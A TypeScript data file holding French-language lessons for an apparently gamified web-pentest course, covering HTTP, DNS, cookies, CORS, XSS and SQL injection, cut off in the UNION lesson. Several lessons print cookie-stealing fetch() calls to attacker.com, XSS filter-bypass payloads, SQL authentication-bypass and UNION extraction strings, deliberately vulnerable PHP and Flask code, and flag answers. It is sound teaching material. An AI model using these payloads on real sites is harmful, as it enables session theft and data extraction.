import { Module, modules } from './modules';

export interface Lesson {
  id: string;
  slug: string;
  moduleSlug: string;
  title: string;
  description: string;
  content: string;
  xpReward: number;
  order: number;
}

export const lessons: Lesson[] = [
  // Module 1: Web Fundamentals
  {
    id: 'http-basics',
    slug: 'http-basics',
    moduleSlug: 'web-fundamentals',
    title: 'HTTP : Méthodes, Codes et Headers',
    description: 'Comprendre le protocole HTTP, les méthodes de requête, les codes de statut et les headers importants.',
    xpReward: 100,
    order: 1,
    content: `# HTTP : Méthodes, Codes et Headers

## Objectif
Comprendre le fonctionnement du protocole HTTP, les différentes méthodes de requête, les codes de statut et les headers essentiels pour le pentest.

## Théorie

### Qu'est-ce que HTTP ?
HTTP (HyperText Transfer Protocol) est le protocole de communication entre les navigateurs (clients) et les serveurs web. Il fonctionne selon un modèle requête-réponse.

### Les Méthodes HTTP
Les méthodes indiquent l'action désirée sur la ressource :

| Méthode | Description | Usage typique |
|---------|-------------|---------------|
| GET | Récupérer une ressource | Navigation, API read |
| POST | Créer une ressource | Formulaires, API create |
| PUT | Remplacer une ressource | API update complet |
| PATCH | Modifier partiellement | API update partiel |
| DELETE | Supprimer une ressource | API delete |
| HEAD | Récupérer les headers seulement | Vérification sans body |
| OPTIONS | Lister les méthodes supportées | CORS preflight |

### Les Codes de Statut
Les codes de réponse indiquent le résultat de la requête :

- **1xx (Informationnel)** : La requête est reçue et le processus continue
- **2xx (Succès)** : La requête est reçue, comprise et acceptée
  - \`200 OK\` : Requête réussie
  - \`201 Created\` : Ressource créée
  - \`204 No Content\` : Succès sans contenu à renvoyer
- **3xx (Redirection)** : Des actions supplémentaires sont nécessaires
  - \`301 Moved Permanently\` : Ressource déplacée définitivement
  - \`302 Found\` : Redirection temporaire
  - \`304 Not Modified\` : Cache valide
- **4xx (Erreur client)** : La requête contient une erreur
  - \`400 Bad Request\` : Requête malformée
  - \`401 Unauthorized\` : Authentification requise
  - \`403 Forbidden\` : Accès refusé
  - \`404 Not Found\` : Ressource introuvable
- **5xx (Erreur serveur)** : Le serveur a échoué
  - \`500 Internal Server Error\` : Erreur générique
  - \`502 Bad Gateway\` : Passerelle invalide
  - \`503 Service Unavailable\` : Service indisponible

### Headers HTTP Importants
Les headers transportent des métadonnées :

**Headers de requête :**
- \`User-Agent\` : Navigateur/client
- \`Accept\` : Types de contenu acceptés
- \`Authorization\` : Credentials d'authentification
- \`Cookie\` : Cookies du client
- \`Referer\` : Page précédente

**Headers de réponse :**
- \`Set-Cookie\` : Cookie à stocker
- \`Content-Type\` : Type de contenu (MIME type)
- \`Cache-Control\` : Directives de cache
- \`Strict-Transport-Security\` : HSTS
- \`X-Frame-Options\` : Protection clickjacking

## Exemple

\`\`\`http
GET /api/users/1 HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Mozilla/5.0

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123; HttpOnly; Secure
Cache-Control: no-store

{
  "id": 1,
  "name": "John Doe"
}
\`\`\`

## Exercice
Utilisez votre navigateur (F12 > Network) pour observer les requêtes HTTP lors de la navigation sur un site. Identifiez les méthodes, codes de statut et headers.

## Flag
Trouvez le code de redirection permanente (3xx) mentionné dans la théorie.

**Format :** \`FLAG{code}\` (exemple : \`FLAG{301}\`)

## Récap
- HTTP est un protocole requête-réponse
- Les méthodes définissent l'action (GET, POST, etc.)
- Les codes de statut indiquent le résultat (2xx, 3xx, 4xx, 5xx)
- Les headers transportent des métadonnées cruciales pour la sécurité
`,
  },
  {
    id: 'dns-basics',
    slug: 'dns-basics',
    moduleSlug: 'web-fundamentals',
    title: 'DNS : Résolution et Records',
    description: 'Comprendre le système DNS, les types d\'enregistrements et le processus de résolution de noms.',
    xpReward: 100,
    order: 2,
    content: `# DNS : Résolution et Records

## Objectif
Comprendre le système DNS (Domain Name System), les types d'enregistrements et comment la résolution de noms fonctionne.

## Théorie

### Qu'est-ce que le DNS ?
Le DNS est comme l'annuaire téléphonique d'Internet. Il traduit les noms de domaine lisibles par l'homme (ex: example.com) en adresses IP (ex: 93.184.216.34).

### Le Processus de Résolution DNS
1. **Requête récursive** : Le client demande au résolveur DNS local
2. **Requête itérative** : Le résolveur interroge les serveurs racines, TLD, puis autoritaires
3. **Réponse** : L'IP est retournée au client

### Types d'Enregistrements DNS

| Type | Nom | Description |
|------|-----|-------------|
| A | Address | Mappe un nom de domaine vers une IPv4 |
| AAAA | IPv6 Address | Mappe vers une IPv6 |
| CNAME | Canonical Name | Alias vers un autre nom de domaine |
| MX | Mail Exchange | Serveurs de messagerie pour le domaine |
| TXT | Text | Texte arbitraire (SPF, DKIM, vérification) |
| NS | Name Server | Serveurs DNS autoritaires pour le domaine |
| SOA | Start of Authority | Infos sur la zone DNS |
| PTR | Pointer | Résolution inverse (IP vers nom) |

### DNS et Sécurité
- **DNS Spoofing** : Empoisonnement du cache DNS
- **DNS Tunneling** : Exfiltration de données via DNS
- **Subdomain Takeover** : Récupération de sous-domaines abandonnés
- **DNSSEC** : Extension de sécurité pour authentifier les réponses

## Exemple

\`\`\`bash
# Requête DNS avec dig
$ dig example.com ANY

;; QUESTION SECTION:
;example.com.			IN	ANY

;; ANSWER SECTION:
example.com.		21599	IN	A	93.184.216.34
example.com.		21599	IN	NS	ns1.example.com.
example.com.		21599	IN	NS	ns2.example.com.
example.com.		3599	IN	MX	10 mail.example.com.
example.com.		21599	IN	TXT	"v=spf1 include:_spf.example.com ~all"
\`\`\`

## Exercice
Utilisez la commande \`dig\` ou \`nslookup\` pour interroger les enregistrements DNS d'un domaine. Identifiez le type d'enregistrement qui crée un alias vers un autre domaine.

## Flag
Quel type d'enregistrement DNS sert à créer un alias vers un autre nom de domaine ?

**Format :** \`FLAG{TYPE}\` (en majuscules, ex: \`FLAG{CNAME}\`)

## Récap
- DNS traduit les noms de domaine en adresses IP
- Plusieurs types d'enregistrements (A, CNAME, MX, etc.)
- La résolution est hiérarchique (racine > TLD > autoritaire)
- DNS est critique pour la sécurité web
`,
  },
  {
    id: 'cookies-sessions',
    slug: 'cookies-sessions',
    moduleSlug: 'web-fundamentals',
    title: 'Cookies & Sessions',
    description: 'Comprendre les cookies, les sessions, les attributs de sécurité et les vulnérabilités associées.',
    xpReward: 100,
    order: 3,
    content: `# Cookies & Sessions

## Objectif
Comprendre le fonctionnement des cookies et des sessions, les attributs de sécurité et les risques associés.

## Théorie

### Les Cookies
Les cookies sont de petits morceaux de données stockés par le navigateur et envoyés au serveur avec chaque requête HTTP. Ils servent à maintenir l'état (state) entre les requêtes.

### Structure d'un Cookie
\`\`\`
Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
\`\`\`

### Attributs de Sécurité des Cookies

| Attribut | Description | Impact Sécurité |
|----------|-------------|-----------------|
| \`Secure\` | Cookie envoyé uniquement via HTTPS | Empêche l'interception en clair |
| \`HttpOnly\` | Inaccessible via JavaScript (document.cookie) | Mitige le vol via XSS |
| \`SameSite\` | Restreint l'envoi cross-site | Mitige les CSRF |
| \`Domain\` | Domaine pour lequel le cookie est valide | Contrôle la portée |
| \`Path\` | Chemin pour lequel le cookie est valide | Limite la portée |
| \`Expires\` / \`Max-Age\` | Durée de vie du cookie | Session vs persistant |
| \`__Host-\` / \`__Secure-\` | Préfixes de sécurité | Renforce la sécurité |

### Sessions
Les sessions stockent les données côté serveur, avec un identifiant (session ID) envoyé via un cookie. C'est plus sécurisé que le stockage côté client pour les données sensibles.

### Vulnérabilités Courantes
- **Session Fixation** : Forcer un ID de session connu
- **Session Hijacking** : Voler un ID de session via XSS, réseau, etc.
- **CSRF** : Exploiter l'envoi automatique des cookies
- **Cookie Tossing** : Manipuler les cookies via des sous-domaines

## Exemple

\`\`\`javascript
// Cookie sans HttpOnly - vulnérable au XSS
document.cookie = "session=abc123"; // Accessible via JS !

// Cookie avec HttpOnly - sécurisé
// Set-Cookie: session=abc123; HttpOnly; Secure

// Attaque XSS pour voler les cookies
fetch('https://attacker.com/steal?cookie=' + document.cookie);
\`\`\`

## Exercice
Inspectez les cookies d'un site web (F12 > Application > Cookies). Identifiez lesquels ont l'attribut \`HttpOnly\` et expliquez pourquoi c'est important.

## Flag
Quel attribut de cookie empêche l'accès via JavaScript et mitige le vol par XSS ?

**Format :** \`FLAG{Attribut}\` (exemple : \`FLAG{HttpOnly}\`)

## Récap
- Les cookies maintiennent l'état entre requêtes HTTP
- \`HttpOnly\` empêche l'accès JS, \`Secure\` force HTTPS, \`SameSite\` mitige CSRF
- Les sessions stockent les données côté serveur
- La gestion des cookies est critique pour l'authentification
`,
  },
  {
    id: 'cors-sop',
    slug: 'cors-sop',
    moduleSlug: 'web-fundamentals',
    title: 'Same-Origin Policy & CORS',
    description: 'Comprendre la Same-Origin Policy, le partage de ressources cross-origin (CORS) et les implications de sécurité.',
    xpReward: 100,
    order: 4,
    content: `# Same-Origin Policy & CORS

## Objectif
Comprendre la Same-Origin Policy (SOP), le mécanisme CORS et les risques de contournement.

## Théorie

### Same-Origin Policy (SOP)
La SOP est une politique de sécurité qui restreint comment un document ou un script chargé depuis une **origin** peut interagir avec une ressource d'une autre **origin**.

**Origin** = \`scheme://host:port\` (ex: \`https://example.com:443\`)

| Origin A | Origin B | Même origin ? |
|----------|----------|---------------|
| \`https://example.com\` | \`https://example.com\` | ✅ Oui |
| \`https://example.com\` | \`http://example.com\` | ❌ Non (scheme différent) |
| \`https://example.com\` | \`https://api.example.com\` | ❌ Non (host différent) |
| \`https://example.com:443\` | \`https://example.com:8080\` | ❌ Non (port différent) |

### Pourquoi la SOP ?
Sans SOP, un script malveillant sur \`evil.com\` pourrait lire les données de \`bank.com\` si vous êtes connecté (via les cookies automatiquement envoyés).

### CORS (Cross-Origin Resource Sharing)
CORS est un mécanisme qui permet de contourner (de manière contrôlée) la SOP. Le serveur indique via des headers HTTP quelles origins sont autorisées.

**Headers CORS importants :**
- \`Access-Control-Allow-Origin\` : Origin autorisée (\`*\` ou URL spécifique)
- \`Access-Control-Allow-Methods\` : Méthodes HTTP autorisées
- \`Access-Control-Allow-Headers\` : Headers autorisés
- \`Access-Control-Allow-Credentials\` : Autorise l'envoi de cookies
- \`Access-Control-Expose-Headers\` : Headers exposés à l'application

### Le Flux CORS (Preflight)
Pour les requêtes "complexes", le navigateur envoie d'abord une requête \`OPTIONS\` (preflight) pour vérifier si la requête est autorisée.

## Exemple

\`\`\`javascript
// Requête cross-origin avec fetch
fetch('https://api.example.com/data', {
  credentials: 'include', // Envoie les cookies
})
  .then(response => response.json())
  .then(data => console.log(data));
// Si le serveur n'envoie pas les bons headers CORS, la requête échoue
\`\`\`

\`\`\`http
# Réponse du serveur avec CORS
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
\`\`\`

## Exercice
Configurez un serveur local pour qu'il accepte les requêtes CORS depuis \`http://localhost:3000\` avec les credentials. Testez avec \`fetch()\`.

## Flag
Dans la SOP, deux URLs avec des **origins différentes** ne peuvent pas partager de ressources. Quel terme décrit cela ?

**Format :** \`FLAG{terme}\` (exemple : \`FLAG{different-origin}\`)

## Récap
- SOP bloque les interactions cross-origin par défaut
- CORS permet de définir des exceptions contrôlées
- \`Access-Control-Allow-Origin\` est le header clé
- Mal configuré, CORS peut créer des failles de sécurité
`,
  },
  // Module 2: XSS
  {
    id: 'xss-intro',
    slug: 'xss-intro',
    moduleSlug: 'xss',
    title: 'Introduction XSS',
    description: 'Comprendre les types de XSS (Reflected, Stored, DOM-based), leur impact et les vecteurs d\'attaque.',
    xpReward: 150,
    order: 1,
    content: `# Introduction XSS

## Objectif
Comprendre les vulnérabilités Cross-Site Scripting (XSS), les différents types et leur impact sur la sécurité.

## Théorie

### Qu'est-ce que le XSS ?
Le Cross-Site Scripting (XSS) est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Ce code s'exécute dans le contexte de la victime.

### Les 3 Types de XSS

#### 1. Reflected XSS (XSS Réfléchi)
Le payload est **réfléchi** dans la réponse immédiate du serveur. Souvent via un paramètre d'URL.

\`\`\`http
GET /search?q=<script>alert('XSS')</script>
\`\`\`

Le serveur renvoie :
\`\`\`html
<p>Résultats pour : <script>alert('XSS')</script></p>
\`\`\`

#### 2. Stored XSS (XSS Stocké)
Le payload est **stocké** sur le serveur (base de données, commentaires, profil) et s'exécute quand d'autres utilisateurs visitent la page.

\`\`\`http
POST /comment
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('Stored XSS')</script>
\`\`\`

#### 3. DOM-based XSS
La vulnérabilité est dans le **code JavaScript côté client** qui manipule le DOM de manière insécure.

\`\`\`javascript
// Vulnérable
const name = window.location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Bonjour ' + name;
// L'attaquant utilise : http://site.com/#<script>alert(1)</script>
\`\`\`

### Impact du XSS
- **Vol de cookies/sessions** : \`document.cookie\`
- **Détournement de compte** : CSRF, changement de mot de passe
- **Phishing** : Faux formulaires de login
- **Keylogging** : Enregistrement des frappes
- **Crypto-mining** : Utilisation des ressources de la victime
- **Propagation** : XSS worm (ex: Samy worm sur MySpace)

## Exemple

\`\`\`html
<!-- Page vulnérable (reflected XSS) -->
<!DOCTYPE html>
<html>
<body>
  <h1>Recherche</h1>
  <p>Vous avez cherché : <?php echo $_GET['q']; ?></p>
  <!-- Si q=<script>alert(1)</script>, le script s'exécute -->
</body>
</html>
\`\`\`

\`\`\`javascript
// Attaque : vol de cookies
fetch('https://attacker.com/steal?c=' + btoa(document.cookie));
\`\`\`

## Exercice
Identifiez quel type de XSS est décrit : "Le payload est stocké dans une base de données et s'exécute lorsqu'un autre utilisateur visite la page."

## Flag
Quel type de XSS est caractérisé par un payload stocké de manière permanente sur le serveur ?

**Format :** \`FLAG{type}\` (exemple : \`FLAG{stored-xss}\`)

## Récap
- XSS = injection de JavaScript malveillant
- 3 types : Reflected, Stored, DOM-based
- Impact : vol de session, phishing, keylogging, etc.
- La prévention nécessite encoding, validation et CSP
`,
  },
  {
    id: 'reflected-xss',
    slug: 'reflected-xss',
    moduleSlug: 'xss',
    title: 'Reflected XSS',
    description: 'Exploiter les XSS réfléchis avec des payloads basiques et comprendre les techniques de filtrage.',
    xpReward: 150,
    order: 2,
    content: `# Reflected XSS

## Objectif
Apprendre à exploiter les vulnérabilités Reflected XSS avec des payloads basiques et comprendre les mécanismes de filtrage.

## Théorie

### Fonctionnement du Reflected XSS
Le Reflected XSS se produit quand une application web renvoie immédiatement une entrée utilisateur dans la réponse HTTP sans validation ni encodage adéquat.

**Scénario typique :**
1. L'attaquant trouve un paramètre d'URL vulnérable
2. Il construit une URL malveillante avec le payload JavaScript
3. Il incite la victime à cliquer sur le lien (phishing, raccourcisseur, etc.)
4. Le script s'exécute dans le navigateur de la victime

### Payloads Basiques

\`\`\`html
<!-- Alert simple -->
<script>alert('XSS')</script>

<!-- Redirection -->
<script>window.location='http://attacker.com'</script>

<!-- Vol de cookies -->
<script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- Image tag (si <script> filtré) -->
<img src=x onerror=alert('XSS')>

<!-- SVG tag -->
<svg/onload=alert('XSS')>

<!-- Body tag -->
<body onload=alert('XSS')>

<!-- Iframe -->
<iframe src="javascript:alert('XSS')"></iframe>
\`\`\`

### Contourner les Filtres Basiques
Les applications filtrent souvent \`<script>\`. Quelques techniques :

\`\`\`html
<!-- Utiliser des événements (event handlers) -->
<img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</select>

<!-- Encodage HTML -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Encodage URL -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Cas mixte -->
<ScRiPt>alert(1)</sCrIpT>
\`\`\`

### Limitations
- Nécessite l'interaction de la victime (clic sur lien)
- Le payload ne persiste pas
- Souvent détecté par les navigateurs (XSS Auditor, CSP)

## Exemple

\`\`\`html
<!-- Page vulnérable (search.php) -->
<form action="search.php" method="GET">
  <input type="text" name="q" placeholder="Rechercher...">
  <button>Rechercher</button>
</form>

<?php
if (isset($_GET['q'])) {
  echo "<p>Résultats pour : " . $_GET['q'] . "</p>";
  // Vulnérable : pas d'encodage de q
}
?>

<!-- Attaque : http://site.com/search.php?q=<script>alert(1)</script> -->
\`\`\`

## Exercice
Testez ce payload dans un environnement contrôlé : \`<script>alert(1)</script>\`. Observez l'exécution du JavaScript.

## Flag
Quel est le payload XSS le plus basique qui affiche une boîte d'alerte ?

**Format :** \`FLAG{payload}\` (avec les balises, ex: \`FLAG{<script>alert(1)</script>}\`)

## Récap
- Reflected XSS : payload réfléchi immédiatement dans la réponse
- Nécessite l'interaction de la victime
- Payloads : \`<script>\`, \`<img onerror>\`, \`<svg/onload>\`, etc.
- Contournement : événements, encodage, cas mixte
`,
  },
  {
    id: 'stored-xss',
    slug: 'stored-xss',
    moduleSlug: 'xss',
    title: 'Stored XSS',
    description: 'Exploiter les XSS stockés, comprendre la persistance et l\'impact sur les utilisateurs multiples.',
    xpReward: 150,
    order: 3,
    content: `# Stored XSS

## Objectif
Comprendre les vulnérabilités Stored XSS (stockés), leur persistance et l'impact dévastateur sur les utilisateurs.

## Théorie

### Fonctionnement du Stored XSS
Le Stored XSS se produit quand une application web stocke une entrée utilisateur malveillante (souvent dans une base de données) et l'affiche plus tard à d'autres utilisateurs sans validation ni encodage.

**Scénario typique :**
1. L'attaquant soumet un commentaire / message / profil contenant du JavaScript malveillant
2. Le serveur stocke ce contenu dans la base de données
3. Un utilisateur légitime visite la page affichant ce contenu
4. Le script s'exécute automatiquement dans son navigateur

### Vecteurs d'Injection Courants
- **Commentaires** sur un blog / forum
- **Profils utilisateur** (bio, nom, avatar URL)
- **Messages privés** / chat
- **Titres d'articles** / posts
- **Champs de description** (produits, événements, etc.)

### Impact Accru par Rapport au Reflected XSS
- **Pas besoin d'interaction** : La victime visite simplement la page
- **Ciblage massif** : Tous les utilisateurs visitant la page sont touchés
- **Persistance** : Le payload reste actif jusqu'à suppression
- **Confiance** : La page semble légitime (pas de lien suspect)

### Exemple d'Attaque : Vol de Session
\`\`\`javascript
// Payload injecté dans un commentaire
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href,
    user: localStorage.getItem('user')
  })
});
</script>
\`\`\`

### XSS Worm (Ver XSS)
Un XSS worm peut se propager automatiquement en injectant du code qui crée de nouveaux contenus malveillants.

**Exemple historique :** Samy worm sur MySpace (2005) a infecté un million de profils en 24h.

## Exemple

\`\`\`html
<!-- Formulaire de commentaire vulnérable -->
<form action="/comment" method="POST">
  <textarea name="comment" placeholder="Votre commentaire..."></textarea>
  <button>Envoyer</button>
</form>

<!-- Affichage des commentaires (vulnérable) -->
<div id="comments">
  <?php foreach ($comments as $comment): ?>
    <div class="comment">
      <?php echo $comment['content']; // Pas d'encodage ! ?>
    </div>
  <?php endforeach; ?>
</div>

<!-- Attaque : commentaire contenant <script>alert('Stored XSS')</script> -->
\`\`\`

## Exercice
Réfléchissez : Pourquoi le Stored XSS est-il considéré comme plus dangereux que le Reflected XSS ? Quel aspect de l'attaque le rend particulièrement insidieux ?

## Flag
Où le payload XSS stocké est-il conservé avant d'être affiché à la victime ?

**Format :** \`FLAG{emplacement}\` (exemple : \`FLAG{database}\`)

## Récap
- Stored XSS : payload stocké sur le serveur, exécuté lors de l'affichage
- Plus dangereux : pas d'interaction, ciblage massif, persistant
- Vecteurs : commentaires, profils, messages, etc.
- Peut mener à des XSS worms auto-réplicants
`,
  },
  {
    id: 'xss-prevention',
    slug: 'xss-prevention',
    moduleSlug: 'xss',
    title: 'Prévention XSS',
    description: 'Apprendre les techniques de prévention : encoding, validation, CSP et bonnes pratiques.',
    xpReward: 150,
    order: 4,
    content: `# Prévention XSS

## Objectif
Maîtriser les techniques de prévention des vulnérabilités XSS : encoding, validation, Content Security Policy (CSP) et bonnes pratiques.

## Théorie

### 1. Output Encoding (Encodage de Sortie)
L'approche la plus efficace : encoder les caractères spéciaux selon le contexte.

**Contextes et encodage :**

| Contexte | Encodage | Exemple |
|----------|----------|---------|
| HTML body | HTML entities | \`<\` → \`&lt;\` |
| HTML attribute | HTML entities + quotes | \`"\` → \`&quot;\` |
| JavaScript | JS encoding | \`'\` → \`\\x27\` |
| URL | URL encoding | \`&\` → \`%26\` |
| CSS | CSS escaping | \`<\` → \`\\3C\` |

\`\`\`javascript
// Mauvais : vulnérable
document.getElementById('output').innerHTML = userInput;

// Bon : encodage HTML
function encodeHTML(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
}
document.getElementById('output').textContent = userInput; // Plus sûr !
\`\`\`

### 2. Input Validation (Validation d'Entrée)
Valider que l'entrée correspond au format attendu (whitelist approach).

\`\`\`javascript
// Validation d'un nom d'utilisateur (alphanumérique seulement)
function validateUsername(input) {
  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
}
\`\`\`

### 3. Content Security Policy (CSP)
Le CSP est un header HTTP qui restreint les sources de scripts, styles, etc.

\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'
\`\`\`

**Directives CSP courantes :**
- \`default-src\` : Politique par défaut
- \`script-src\` : Sources de scripts autorisées
- \`style-src\` : Sources de styles autorisées
- \`img-src\` : Sources d'images autorisées
- \`connect-src\` : Cibles pour fetch/XHR
- \`frame-src\` : Sources pour iframes

**Nonces et hashes :**
\`\`\`html
<!-- Utilisation d'un nonce -->
<script nonce="abc123">console.log('Script autorisé');</script>

<!-- CSP : script-src 'self' 'nonce-abc123' -->
\`\`\`

### 4. HttpOnly Cookies
Empêche l'accès aux cookies via JavaScript.

\`\`\`http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

### 5. Bonnes Pratiques
- **Ne jamais faire confiance à l'entrée utilisateur**
- **Utiliser des frameworks modernes** (React, Vue) qui encodent par défaut
- **Éviter \`innerHTML\`, \`document.write()\`**, préférer \`textContent\`, \`createElement()\`
- **Activer le CSP** avec une politique stricte
- **Sanitize HTML** si du HTML est autorisé (ex: DOMPurify)

\`\`\`javascript
// Utiliser DOMPurify pour sanitizer du HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
\`\`\`

## Exemple

\`\`\`http
# Header CSP strict
Content-Security-Policy: 
  default-src 'none';
  script-src 'self' 'nonce-2726c7f26c' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
\`\`\`

## Exercice
Rédigez un header CSP qui autorise uniquement les scripts provenant du même origin (\`self\`) et bloque tout le reste.

## Flag
Quel header HTTP permet de restreindre les sources de scripts et prévenir l'exécution de scripts non autorisés ?

**Format :** \`FLAG{header-name}\` (exemple : \`FLAG{Content-Security-Policy}\`)

## Récap
- Encoding : encoder selon le contexte (HTML, JS, URL, CSS)
- Validation : whitelist des entrées
- CSP : header puissant pour restreindre l'exécution
- HttpOnly : protège les cookies de session
- Frameworks modernes + bonnes pratiques = défense en profondeur
`,
  },
  // Module 3: SQL Injection
  {
    id: 'sqli-basics',
    slug: 'sqli-basics',
    moduleSlug: 'sql-injection',
    title: 'Bases SQLi',
    description: 'Comprendre l\'injection SQL basique, la syntaxe SQL et les premières exploitations.',
    xpReward: 200,
    order: 1,
    content: `# Bases SQLi

## Objectif
Comprendre les vulnérabilités d'injection SQL (SQLi) basiques, la syntaxe SQL et comment les exploiter.

## Théorie

### Qu'est-ce que l'Injection SQL ?
L'injection SQL est une vulnérabilité qui permet à un attaquant d'interférer avec les requêtes SQL d'une application. Cela permet de voir des données non autorisées ou de les modifier/supprimer.

### Syntaxe SQL de Base

\`\`\`sql
-- Sélection de données
SELECT column1, column2 FROM table WHERE condition;

-- Insertion
INSERT INTO table (col1, col2) VALUES ('val1', 'val2');

-- Mise à jour
UPDATE table SET col1 = 'val1' WHERE condition;

-- Suppression
DELETE FROM table WHERE condition;

-- Commentaires
-- Commentaire sur une ligne
/* Commentaire multiligne */
\`\`\`

### Comment l'Injection SQL Se Produit
L'injection se produit quand une entrée utilisateur est concaténée directement dans une requête SQL sans validation ni paramétrage.

\`\`\`php
// Code vulnérable (PHP)
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
// Si username = admin' OR '1'='1, la requête devient :
// SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// '1'='1' est toujours vrai, donc tous les utilisateurs sont retournés !
\`\`\`

### Bypass d'Authentification Basique
\`\`\`sql
-- Requête normale
SELECT * FROM users WHERE username = 'admin' AND password = 'secret';

-- Injection pour bypass
Username: admin' --
Password: (n'importe quoi)
-- Requête : SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
-- Le -- commente le reste, donc pas besoin de mot de passe !
\`\`\`

### Autres Payloads de Bypass
\`\`\`sql
' OR '1'='1
' OR 1=1 --
admin' OR '1'='1' #
" OR ""="" 
' OR 'x'='x
\`\`\`

## Exemple

\`\`\`python
# Application Flask vulnérable
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # Vulnérable : concaténation directe
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    result = db.execute(query).fetchone()
    if result:
        return "Login successful"
    return "Login failed"

# Attaque : username = admin' --, password = n'importe quoi
# Requête exécutée : SELECT * FROM users WHERE username = 'admin' --' AND password = 'n'importe quoi'
# Le -- commente tout après, donc le mot de passe n'est pas vérifié
\`\`\`

## Exercice
Testez ce payload dans un environnement contrôlé : \`admin' OR '1'='1\`. Observez comment la condition toujours vraie modifie le résultat de la requête.

## Flag
Quel payload permet de bypasser une authentification en rendant la condition WHERE toujours vraie ?

**Format :** \`FLAG{payload}\` (avec les quotes, ex: \`FLAG{' OR '1'='1}\`)

## Récap
- SQLi = injection de code SQL malveillant via l'entrée utilisateur
- Causé par la concaténation directe dans les requêtes SQL
- Bypass d'authentification avec \`OR 1=1\` ou \`--\` (commentaire)
- Toujours utiliser des requêtes paramétrées (prepared statements)
`,
  },
  {
    id: 'union-sqli',
    slug: 'union-sqli',
    moduleSlug: 'sql-injection',
    title: 'Union-based SQLi',
    description: 'Exploiter l\'injection SQL avec UNION pour extraire des données d\'autres tables.',
    xpReward: 200,
    order: 2,
    content: `# Union-based SQLi

## Objectif
Apprendre à utiliser l'opérateur UNION pour extraire des données d'autres tables via une injection SQL.

## Théorie

### L'Opérateur UNION
L'opérateur \`UNION\` en SQL combine les résultats de deux requêtes SELECT. Pour que l'UNION fonctionne :
1. Les deux requêtes doivent retourner le **même nombre de colonnes**
2. Les types de données des colonnes doivent être **compatibles**

\`\`\`sql
SELECT column1, column2 FROM table1
UNION
SELECT column3, column4 FROM table2;
\`\`\`

### Exploitation avec UNION
L'attaquant peut utiliser UNION pour extraire des données d'autres tables (ex: utilisateurs, mots de passe).

\`\`\`sql
-- Requête vulnérable normale
SELECT title, content FROM posts WHERE id = 1;

-- Injection UNION pour extraire les utilisateurs
SELECT title, content FROM posts WHERE id = 1 UNION SELECT username, password FROM users;
-- Mais il faut d'abord connaître le nombre de colonnes !
\`\`\`

### Étape 1 : Déterminer le Nombre de Colonnes
Utilisez \`ORDER BY\` ou \`UNION SELECT\` avec des valeurs NULL.

\`\`\`sql
-- Avec ORDER BY (incrémenter jusqu'à erreur)
1' ORDER BY 1 -- (OK)
1' ORDER BY 2 -- (OK)
1' ORDER BY 3 -- (Erreur ! Donc 2 colonnes)
\`\`\`

\`\`\`sql
-- Avec UNION SELECT NULL
1' UNION SELECT NULL -- (Erreur si pas le bon nombre)
1' UNION SELECT NULL, NULL -- (OK ! Donc 2 colonnes)
\`\`\`

### Étape 2 : Extraire les Données
\`\`\`sql
-- Récupérer la version de la base
1' UNION SELECT NULL, @@version --

-- Récupérer les tables de la base
1' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Récupérer les colonnes d'une table
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --

-- Récupérer les données utilisateurs
1' UNION SELECT username, password FROM users --
\`\`\`

### Base de Données : information_schema
\`information_schema\` est une base de données standard qui contient des métadonnées.

| Table | Description |
|-------|-------------|
| \`information_schema.tables\` | Toutes les tables |
| \`information_schema.columns\` | Toutes les colonnes |
| \`information_schema.schemata\` | Tous les schémas (bases) |

## Exemple

\`\`\`sql
-- Application vulnérable : recherche de produits
SELECT name, price FROM products WHERE category = 'Electronics';

-- Injection pour découvrir le nombre de colonnes
Electronics' ORDER BY 1 -- (OK)
Electronics' ORDER BY 2 -- (OK)
Electronics' ORDER BY 3 -- (Erreur : Unknown column '3')

-- Donc 2 colonnes. Injection UNION :
Electronics' UNION SELECT table_name, table_schema FROM information_schema.tables --

-- Pour extraire les utilisateurs :
Electronics' UNION SELECT username, password FROM users --
\`\`\`

## Exercice
Si une requête a 3 colonnes et que vous voulez extraire le nom d'utilisateur et le mot de passe, quel payload UNION utiliseriez-vous ? (Utilisez NULL pour la 3ème colonne).

## Flag
Si une requête a 3 colonnes, combien de valeurs (ou NULL) devez-vous spécifier dans le SELECT après UNION ?

**Format :** \`FLAG{nombre}\` (exemple : \`FLAG{3}\`)

## Récap
- UNION combine les résultats de deux requêtes SELECT
- Trouver le nombre de colonnes avec ORDER BY ou UNION SELECT NULL
- Utiliser information_schema pour découvrir les tables/colonnes
